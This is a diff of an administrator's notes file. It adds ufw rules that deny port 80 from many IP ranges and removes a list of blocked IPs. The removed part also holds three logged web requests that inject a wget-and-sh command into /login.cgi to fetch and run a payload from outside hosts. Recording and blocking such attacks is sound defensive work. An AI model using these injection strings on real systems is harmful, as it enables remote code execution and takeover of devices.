@@ -1,31 +1,32 @@
 monitoreo dstat -cdngy 
 
 sudo ufw deny from 192.168.1.5 to any
-ufw deny proto tcp from 66.249.0.0 to 66.249.255.255 port 80
+ufw deny proto tcp from 83.147.220.0 to 83.147.220.255 port 80
+
+ufw deny proto tcp from 191.97.47.0 to 191.97.47.255 port 80
+ufw deny proto tcp from 178.156.82.0 to 178.156.82.255 port 80
+ufw deny proto tcp from 43.229.74.0 to 43.229.74.255 port 80
+ufw deny proto tcp from 45.221.74.0 to 45.221.74.255 port 80
+ufw deny proto tcp from 103.111.219.0 to 103.111.219.255 port 80
+ufw deny proto tcp from 181.48.225.0 to 181.48.225.255 port 80
+ufw deny proto tcp from 88.130.106.0 to 88.130.106.255 port 80
+ufw deny proto tcp from 66.240.205.0 to 66.240.205.255 port 80
+ufw deny proto tcp from 186.134.131.0 to 186.134.131.255 port 80
+ufw deny proto tcp from 178.156.83.0 to 178.156.83.255 port 80
+ufw deny proto tcp from 212.237.45.0 to 212.237.45.255 port 80
 
 
+ufw deny proto tcp from 5.196.87.0 to 5.196.87.255 port 80
+ufw deny proto tcp from 104.192.74.0 to 104.192.74.255 port 80
+ufw deny proto tcp from 54.36.150.0 to 54.36.150.255 port 80
+ufw deny proto tcp from 185.234.219.0 to 185.234.219.255 port 80
+ufw deny proto tcp from 66.249.66.0 to 66.249.66.255 port 80
+ufw deny proto tcp from 51.254.28.0 to 51.254.28.255 port 80
+ufw deny proto tcp from 23.94.232.0 to 23.94.232.255 port 80
+ufw deny proto tcp from 157.55.39.0 to 157.55.39.255 port 80
+ufw deny proto tcp from 207.46.13.0 to 207.46.13.255 port 80
+ufw deny proto tcp from 157.55.39.0 to 157.55.39.255 port 80
+ufw deny proto tcp from 39.98.62.0 to 39.98.62.255 port 80
+ufw deny proto tcp from 54.36.150.0 to 54.36.150.255 port 80
+ufw deny proto tcp from 98.143.159.0 to 98.143.159.255 port 80
 
-
-5.150.131.172 - - [21/Aug/2018:02:36:07 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1" 400 -
-156.221.24.192 - - [21/Aug/2018:02:44:52 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://50.115.166.136/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 -
-156.209.19.198 - - [21/Aug/2018:02:48:27 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://176.32.32.156/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 -
-168.1.128.54
-148.72.176.78
-42.118
-77.87.77.250
-148.72.176.78
-209.141.33.86
-128.199.251.119
-121.201.46.229
-122.114.154.173
-181.49.177.67
-80.211.112.150
-
-94.102.49.193
-80.211.173.159
-110.164.64.56
-85.101.79.70
-182.19.235.46
-82.177.122.132
-66.42.58.227
----------------------------------------bloqueadas
